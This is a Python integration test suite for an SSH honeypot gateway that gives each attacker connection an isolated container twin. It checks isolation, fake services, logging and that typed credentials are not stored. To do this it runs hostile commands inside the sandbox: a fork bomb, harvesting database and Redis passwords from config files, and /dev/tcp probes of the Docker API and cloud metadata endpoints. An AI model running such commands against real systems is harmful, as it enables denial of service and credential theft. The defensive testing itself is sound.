"""Phase 4 exit criteria against real Docker: an SSH client talks to the gateway, which gives each connection its own
twin built from a discovered server (run for both demo servers; every assertion is derived from the snapshot).

Start the demo stacks first (see test_docker_build.py). Skipped when Docker, the base image or a stack is missing."""
import asyncio
import re
from datetime import UTC, datetime

import asyncssh
import pytest
from sqlalchemy import select

import app.immutability  # noqa: F401
from app import services
from app.ai.provider import TemplateProvider
from app.config import Settings
from app.db import Base
from app.discovery.docker_inventory import ReadOnlyDocker
from app.environment import pipeline
from app.environment.image_builder import DockerImageBuilder
from app.gateway.server import start_gateway
from app.models import GatewayEvent, HoneypotSession, ServiceProfile, SessionEvent, VirtualNode
from app.orchestration import session_manager as sm
from app.runtime.policy import ExecutionPolicy
from tests.conftest import file_session_factory
from tests.helpers_runtime import twin_driver
from tests.test_docker_build import BASE, STACKS, _docker, _running
from tests.test_gateway import read_until

pytestmark = pytest.mark.docker
PROJECTS = [pytest.param(p, id=p, marks=pytest.mark.skipif(not _running(p), reason=f"{p} stack / Docker not available"))
            for p in STACKS]


class Env:
    """A published snapshot, a real runtime and a running gateway for one demo server."""


@pytest.fixture(scope="module", params=PROJECTS)
def env(request, tmp_path_factory):
    project = request.param
    client = _docker()
    sf = file_session_factory(tmp_path_factory.mktemp("db"))  # several threads use it at once
    builder = DockerImageBuilder(client)
    e = Env()
    e.project, e.sf, e.client = project, sf, client
    with sf() as db:
        snap = pipeline.build_from_docker(
            db, docker=ReadOnlyDocker(client), image_builder=builder, provider=TemplateProvider(), project=project,
            allowed_projects={project}, base_image=BASE, build_dir=tmp_path_factory.mktemp("b"), actor="itest",
            now=datetime.now(UTC))
        services.publish_snapshot(db, snap)
        db.commit()
        e.image = db.scalars(select(__import__("app.models", fromlist=["TwinImage"]).TwinImage)).one().image_digest
        profs = [p.behavior_config for p in db.scalars(select(ServiceProfile))]
        e.profile = {p["name"]: p for p in profs}
        e.nodes = {n.virtual_path: n for n in db.scalars(select(VirtualNode))}
    e.driver = twin_driver(client)
    e.mgr = sm.SessionManager(e.driver, sf, ExecutionPolicy(timeout_ms=8000, max_active_sessions=6), BASE)
    e.mgr.reconcile()  # twins left by an earlier, killed test run would otherwise be counted as ours
    e.cfg = Settings(admin_api_key="x" * 20, gateway_host_key_path=str(tmp_path_factory.mktemp("k") / "host"),
                     gateway_accept_after=1, gateway_weak_passwords="", _env_file=None)
    yield e
    e.mgr.shutdown()
    e.mgr.reconcile()
    builder.remove(e.image)


def run_gateway(env, scenario):
    """Start the gateway on a free port, run `await scenario(gw)`, always shut down cleanly."""
    async def main():
        gw = await start_gateway(env.mgr, env.cfg, env.sf, port=0)
        try:
            return await scenario(gw)
        finally:
            await gw.close()
    return asyncio.run(main())


async def login(gw, user="root", password="x"):
    return await asyncssh.connect("127.0.0.1", gw.port, username=user, password=password, known_hosts=None,
                                  client_keys=None, agent_path=None)


def svc_of(env, kind):
    return next((n for n, p in env.profile.items() if p.get("emulator") == kind), None)


def test_real_commands_real_exit_codes_and_real_hostname(env):
    async def scenario(gw):
        c = await login(gw)
        ok = await c.run("uname -s; id -un; hostname", check=False)
        missing = await c.run("ls /does/not/exist", check=False)
        code = await c.run("exit 7", check=False)
        c.close()
        return ok, missing, code

    ok, missing, code = run_gateway(env, scenario)
    assert ok.stdout.split() [0:2] == ["Linux", "user"] and ok.stdout.split()[2].startswith("srv-")
    assert missing.exit_status == 2 and "No such file" in missing.stderr
    assert code.exit_status == 7
    assert env.driver.list_managed() == []                      # the connection is gone, so is its twin


def test_interactive_shell_is_persistent_and_files_survive_between_commands(env):
    async def scenario(gw):
        c = await login(gw)
        p = await c.create_process(term_type="xterm", term_size=(120, 30))
        screen = await read_until(p.stdout, "$ ")
        for line, wait_for in (("cd /var/log", "/var/log$ "), ("export WHO=intruder", "$ "), ("pwd", "$ "),
                               ("echo $WHO", "intruder"), ("echo note > ~/note.txt", "$ "), ("cd", "~$ "),
                               ("cat note.txt", "note"), ("exit", "logout")):
            p.stdin.write(line + "\n")
            screen += await read_until(p.stdout, wait_for)
        await p.wait()
        c.close()
        return screen, p.exit_status

    screen, status = run_gateway(env, scenario)
    assert status == 0 and "Last login:" in screen
    assert "/var/log$ " in screen and "/var/log\r\n" in screen and "intruder" in screen and "note" in screen
    assert re.search(r"user@srv-[0-9a-f]{6}:~\$ ", screen)


def test_fake_services_answer_real_clients_through_the_gateway(env):
    http, pg, redis = svc_of(env, "http"), svc_of(env, "postgres"), svc_of(env, "redis")
    assert http or pg or redis, "this demo server has no emulated services"

    async def scenario(gw):
        c = await login(gw)
        out = {}
        if http:
            port = env.profile[http]["ports"][0][0] if env.profile[http]["ports"] else 80
            out["http"] = await c.run(f"curl -s -m 5 -i http://{http}:{port}/health", check=False)
            out["api"] = await c.run(f"curl -s -m 5 http://{http}:{port}/api/nope", check=False)
        if pg:
            pgpass = (await c.run("cat ~/.pgpass", check=False)).stdout.strip().split(":")
            db, user, pw = pgpass[2], pgpass[3], pgpass[4]
            out["psql"] = await c.run(f"PGPASSWORD='{pw}' psql -h {pg} -U {user} {db} -tA -c 'select count(*) from information_schema.tables'", check=False)
            out["bad"] = await c.run(f"PGPASSWORD=wrong psql -h {pg} -U {user} {db} -c 'select 1' 2>&1", check=False)
            out["dt"] = await c.run(f"PGPASSWORD='{pw}' psql -h {pg} -U {user} {db} -c '\\dt'", check=False)
        if redis:
            conf = next(p for p in (await c.run("grep -rl requirepass /etc 2>/dev/null", check=False)).stdout.split())
            rpw = (await c.run(f"grep requirepass {conf}", check=False)).stdout.split()[-1]
            out["redis"] = await c.run(f"redis-cli -h {redis} -a '{rpw}' --no-auth-warning ping", check=False)
            out["redis_noauth"] = await c.run(f"redis-cli -h {redis} get x", check=False)
        c.close()
        return out

    out = run_gateway(env, scenario)
    if http:
        assert "200 OK" in out["http"].stdout and '"status": "ok"' in out["http"].stdout and "Server:" in out["http"].stdout
        assert "not found" in out["api"].stdout
    if pg:
        assert int(out["psql"].stdout.strip()) >= 2
        assert "password authentication failed" in out["bad"].stdout
        assert "List of relations" in out["dt"].stdout and "(0 rows)" not in out["dt"].stdout
    if redis:
        assert out["redis"].stdout.strip() == "PONG" and "NOAUTH" in out["redis_noauth"].stdout


def test_two_simultaneous_connections_cannot_see_each_other(env):
    async def scenario(gw):
        a, b = await login(gw), await login(gw)
        await a.run("echo secret > /tmp/only-in-a; sleep 300 >/dev/null 2>&1 &", check=False)
        results = await asyncio.gather(b.run("ls /tmp; ps aux", check=False), b.run("hostname", check=False),
                                       a.run("hostname", check=False), a.run("cat /tmp/only-in-a", check=False))
        listing, hb, ha, own = results
        await a.run("echo mine > ~/a-home", check=False)
        b_home = await b.run("ls -A ~", check=False)
        a.close()
        b.close()
        return listing, ha.stdout, hb.stdout, own, b_home

    listing, ha, hb, own, b_home = run_gateway(env, scenario)
    assert "only-in-a" not in listing.stdout and "sleep 300" not in listing.stdout
    assert own.stdout.strip() == "secret" and ha != hb
    assert "a-home" not in b_home.stdout


def test_fake_service_state_is_not_shared_between_visitors(env):
    """Phase 7.1: two simultaneous visitors each talk to their own fake services. What one writes (here into the
    fake cache), the other never sees."""
    redis = svc_of(env, "redis")
    if not redis:
        pytest.skip("this demo server has no cache service")

    async def scenario(gw):
        a, b = await login(gw, "alice"), await login(gw, "bob")
        out = {}
        for name, c in (("a", a), ("b", b)):
            conf = next(p for p in (await c.run("grep -rl requirepass /etc 2>/dev/null", check=False)).stdout.split())
            pw = (await c.run(f"grep requirepass {conf}", check=False)).stdout.split()[-1]
            out[name] = f"redis-cli -h {redis} -a '{pw}' --no-auth-warning"
        await a.run(f"{out['a']} SET visitor-a-marker written-by-a", check=False)
        out["a_sees"] = (await a.run(f"{out['a']} GET visitor-a-marker", check=False)).stdout.strip()
        out["b_sees"] = (await b.run(f"{out['b']} GET visitor-a-marker", check=False)).stdout.strip()
        out["b_keys"] = (await b.run(f"{out['b']} KEYS 'visitor-*'", check=False)).stdout.strip()
        a.close()
        b.close()
        return out

    out = run_gateway(env, scenario)
    assert out["a_sees"] == "written-by-a"          # the write worked for the visitor who made it
    assert out["b_sees"] == "" and out["b_keys"] == ""  # and is invisible to the other one


def test_reconnecting_gives_a_clean_twin_and_the_old_one_is_destroyed(env):
    async def scenario(gw):
        first = await login(gw)
        await first.run("echo left-behind > ~/dropped.txt; echo x > /tmp/dropped", check=False)
        before = len(env.driver.list_managed())
        first.close()
        await first.wait_closed()
        await asyncio.sleep(1.5)
        after_close = len(env.driver.list_managed())
        second = await login(gw)
        r = await second.run("ls -A ~ /tmp", check=False)
        second.close()
        return before, after_close, r

    before, after_close, r = run_gateway(env, scenario)
    assert (before, after_close) == (1, 0)
    assert "dropped" not in r.stdout


def test_the_twin_cannot_reach_the_host_other_sessions_or_the_gateway(env):
    async def scenario(gw):
        c = await login(gw)
        net = await c.run("ip -o addr | awk '{print $2}' | sort -u | tr '\\n' ' '", check=False)
        probes = []
        for target in (f"127.0.0.1:{gw.port}", "host.docker.internal:8000", "host.docker.internal:22", "172.17.0.1:2375",
                       "169.254.169.254:80", "1.1.1.1:53"):
            host, port = target.rsplit(":", 1)
            probes.append((target, await c.run(f"timeout 3 bash -c 'exec 3<>/dev/tcp/{host}/{port}' 2>&1; echo rc=$?", check=False)))
        c.close()
        return net, probes

    net, probes = run_gateway(env, scenario)
    assert net.stdout.strip() == "lo"                                  # no network interface except loopback
    for target, r in probes:
        assert "rc=0" not in r.stdout, f"{target} was reachable from inside the twin"


def test_attacker_cannot_read_or_stop_the_fake_services(env):
    if not any(p.get("emulator") for p in env.profile.values()):
        pytest.skip("no emulated services in this snapshot")

    async def scenario(gw):
        c = await login(gw)
        r = {
            "events": await c.run("cat /run/hornet/events.jsonl 2>&1", check=False),
            "config": await c.run("cat /usr/share/hornet/services.json 2>&1", check=False),
            # the [r] keeps the pattern from matching this very command line
            "kill": await c.run("pkill -9 -f 'emulato[r].py' 2>&1; echo; pgrep -f 'emulato[r].py' | wc -l", check=False),
            "still": await c.run("ss -ltn | grep -c LISTEN", check=False),
        }
        c.close()
        return r

    r = run_gateway(env, scenario)
    assert "Permission denied" in r["events"].stdout and "Permission denied" in r["config"].stdout
    assert "Operation not permitted" in r["kill"].stdout                      # another user's process: cannot be signalled
    assert int(r["kill"].stdout.strip().splitlines()[-1]) >= 1                 # and it is still running
    assert int(r["still"].stdout.strip()) >= 1


def test_a_fork_bomb_ends_the_connection_and_the_next_visitor_is_fine(env):
    async def scenario(gw):
        c = await login(gw)
        await c.run("echo warm-up", check=False)
        try:
            await c.run(":(){ :|:& };:", check=False)
        except (asyncssh.Error, ConnectionError):
            pass
        await asyncio.wait_for(c.wait_closed(), 20)               # the gateway hangs up on the abuser
        await asyncio.sleep(1)
        fresh = await login(gw)
        ok = await fresh.run("echo healthy", check=False)
        fresh.close()
        return ok

    ok = run_gateway(env, scenario)
    assert ok.stdout == "healthy\n" and env.driver.list_managed() == []
    with env.sf() as s:
        # runc: the process table fills ("process limit"); gVisor: the whole sandbox ends ("runtime stopped")
        bombed = [x for x in s.scalars(select(HoneypotSession))
                  if x.end_reason in ("limit exceeded: process limit", "limit exceeded: runtime stopped")]
        assert len(bombed) == 1 and bombed[0].status == "destroyed"       # the cause survives the later cleanup


def test_everything_the_attacker_did_is_recorded_and_linked(env):
    pg = svc_of(env, "postgres")

    async def scenario(gw):
        c = await login(gw, "oracle", "hunter2")
        await c.run("cat /etc/passwd | head -1; cat ~/.pgpass", check=False)
        if pg:
            pgpass = (await c.run("cat ~/.pgpass", check=False)).stdout.strip().split(":")
            await c.run(f"PGPASSWORD='{pgpass[4]}' psql -h {pg} -U {pgpass[3]} {pgpass[2]} -c 'select 1'", check=False)
        c.close()
        await c.wait_closed()
        await asyncio.sleep(1)

    run_gateway(env, scenario)
    with env.sf() as s:
        gw_events = list(s.scalars(select(GatewayEvent).order_by(GatewayEvent.occurred_at)))
        kinds = [e.event_type for e in gw_events]
        assert kinds[0] == "connection.opened" and "session.created" in kinds and kinds[-1] == "connection.closed"
        login_ev = next(e for e in gw_events if e.event_type == "auth.password" and e.meta["user"] == "oracle")
        # default config: the attempted password is reduced to its length and a short hash
        assert "password" not in login_ev.meta and login_ev.meta["password_len"] == 7 and login_ev.source_ip == "127.0.0.1"
        assert "hunter2" not in str([e.meta for e in gw_events])
        last = list(s.scalars(select(HoneypotSession).order_by(HoneypotSession.started_at.desc())))[0]
        evs = list(s.scalars(select(SessionEvent).where(SessionEvent.session_id == last.id)))
        access = {e.meta["path"]: e.node_id for e in evs if e.event_type == "resource_access"}
        assert access["/etc/passwd"] == env.nodes["/etc/passwd"].id and access["/home/user/.pgpass"] == env.nodes["/home/user/.pgpass"].id
        assert all(e.meta["basis"] == "command-argument" for e in evs if e.event_type == "resource_access")
        if pg:
            pg_ev = [e for e in evs if e.event_type == "service.postgres"]
            assert {e.meta["action"] for e in pg_ev} >= {"auth", "sql"} and all(e.node_id == env.nodes[f"/services/{pg}"].id for e in pg_ev)
            assert not any("password" in str(e.meta).lower() and "hunter2" in str(e.meta) for e in pg_ev)


def test_credentials_an_attacker_types_are_not_stored(env):
    """Default config, real SSH into a real twin: credentials in the login and in commands appear nowhere in the
    database. (Real bash/curl do not echo them back here; stdout/stderr are otherwise stored as evidence.)"""
    canaries = ["CANARY-LOGIN-pw-91", "CANARY-ENV-pw-92", "CANARY-CURL-pw-93", "CANARY-URL-pw-94", "CANARY-FLAG-pw-95"]

    async def scenario(gw):
        c = await login(gw, "deploy", canaries[0])
        for cmd in (f"export DB_PASSWORD={canaries[1]}",
                    f"curl -s -m 2 -u admin:{canaries[2]} http://198.51.100.7/x.sh",
                    f"psql postgresql://shop:{canaries[3]}@198.51.100.7:5432/shop -c 'select 1'",
                    f"mysqldump --password {canaries[4]} shop"):
            await c.run(cmd, check=False)
        c.close()
        await c.wait_closed()
        await asyncio.sleep(1)

    run_gateway(env, scenario)
    with env.sf() as s:
        dump = []
        for table in Base.metadata.sorted_tables:
            dump += [str(tuple(row)) for row in s.execute(table.select())]
    text = "\n".join(dump)
    assert "198.51.100.7" in text  # the evidence around the secrets is kept
    assert not [c for c in canaries if c in text]


def test_unsupported_requests_get_an_out_of_band_ai_proposal(env):
    """Phase 5A end to end: real clients in a real twin hit requests the fake services cannot answer. The attacker
    gets the services' controlled errors; each gap becomes one validated ai_synthesis row, kept out of the evidence."""
    from app.ai.synthesis import SynthesisWorker
    from app.models import AiSynthesis, ExecutionObservation, ExecutionRequest
    from tests.fakes import FakeProvider

    http, pg = svc_of(env, "http"), svc_of(env, "postgres")
    answers = {"postgres": {"kind": "error", "code": "42601", "message": "AI-PROPOSAL syntax error at or near x"},
               "http": {"kind": "response", "status": 404, "body": {"error": "AI-PROPOSAL not found"}}}
    synth = SynthesisWorker(FakeProvider(lambda ctx, _s: answers[ctx["protocol"]]), env.sf, timeout_s=2,
                            max_per_session=10)
    env.mgr.synthesizer = synth

    async def scenario(gw):
        c = await login(gw)
        out = {}
        if pg:
            pgpass = (await c.run("cat ~/.pgpass", check=False)).stdout.strip().split(":")
            out["psql"] = await c.run(f"psql -h {pg} -U {pgpass[3]} {pgpass[2]} -c 'gibberish here' 2>&1", check=False)
        if http:
            port = env.profile[http]["ports"][0][0] if env.profile[http]["ports"] else 80
            out["curl"] = await c.run(f"curl -s -m 5 http://{http}:{port}/admin/login", check=False)
        c.close()
        await c.wait_closed()
        return out

    try:
        out = run_gateway(env, scenario)
        synth.drain()
    finally:
        env.mgr.synthesizer = None
        synth.shutdown()
    if pg:
        assert "syntax error" in out["psql"].stdout and "AI-PROPOSAL" not in out["psql"].stdout  # the real error
    if http:
        assert "not found" in out["curl"].stdout and "AI-PROPOSAL" not in out["curl"].stdout
    with env.sf() as s:
        session_id = s.scalars(select(HoneypotSession).order_by(HoneypotSession.started_at.desc())).first().id
        req_ids = set(s.scalars(select(ExecutionRequest.id).where(ExecutionRequest.session_id == session_id)))
        rows = [r for r in s.scalars(select(AiSynthesis)) if r.request_id in req_ids]
        evidence = str([o.result_metadata for o in s.scalars(
            select(ExecutionObservation).where(ExecutionObservation.request_id.in_(req_ids)))])
    assert sorted(r.response_metadata["proto"] for r in rows) == sorted(p for p, svc in (("postgres", pg), ("http", http))
                                                                        if svc)
    assert all(r.validation_status == "accepted" and r.response_metadata["served"] is False for r in rows)
    assert "AI-PROPOSAL" not in evidence
